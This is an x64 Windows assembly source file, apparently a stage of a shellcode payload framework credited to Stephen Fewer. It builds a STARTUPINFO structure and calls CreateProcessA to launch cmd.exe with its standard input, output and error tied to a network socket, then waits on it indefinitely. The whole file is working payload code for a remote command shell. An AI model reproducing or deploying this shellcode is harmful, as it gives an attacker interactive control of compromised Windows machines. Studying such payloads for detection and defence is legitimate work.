;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
;-----------------------------------------------------------------------------;
[BITS 64]

; Input: RBP must be the address of 'api_call'. RDI must be a socket.
; Output: None.
; Clobbers: RAX, RCX, RDX, RSI, R8, R9, R10, RSP will also be modified

shell:
  mov r8, 'cmd'
  push r8                     ; an extra push for alignment
  push r8                     ; push our command line: 'cmd',0
  mov rdx, rsp                ; save a pointer to the command line
  push rdi                    ; our socket becomes the shells hStdError
  push rdi                    ; our socket becomes the shells hStdOutput
  push rdi                    ; our socket becomes the shells hStdInput
  xor r8, r8                  ; Clear r8 for all the NULL's we need to push
  push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
  pop rcx                     ; Set RCX for the loop
push_loop:                    ;
  push r8                     ; push a null qword
  loop push_loop              ; keep looping untill we have pushed enough nulls
  mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
  lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
  mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
  mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure 
  ; perform the call to CreateProcessA
  push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure 
  push rax                    ; Push the pointer to the STARTUPINFO Structure
  push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
  push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
  push r8                     ; We dont specify any dwCreationFlags 
  inc r8                      ; Increment r8 to be one
  push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
  dec r8                      ; Decrement r8 (third param) back down to zero
  mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                              ; r8 = lpProcessAttributes (NULL)
                              ; rdx = the lpCommandLine to point to "cmd",0
  mov rcx, r8                 ; Set lpApplicationName to NULL as we are using the command line param instead
  mov r10d, 0x863FCC79        ; hash( "kernel32.dll", "CreateProcessA" )
  call rbp                    ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
  ; perform the call to WaitForSingleObject
  xor rdx, rdx
  dec rdx                     ; Decrement rdx down to -1 (INFINITE)
  mov ecx, dword [rsi]        ; set the first param to the handle from our PROCESS_INFORMATION.hProcess
  mov r10d, 0x601D8708        ; hash( "kernel32.dll", "WaitForSingleObject" )
  call rbp                    ; WaitForSingleObject( pi.hProcess, INFINITE );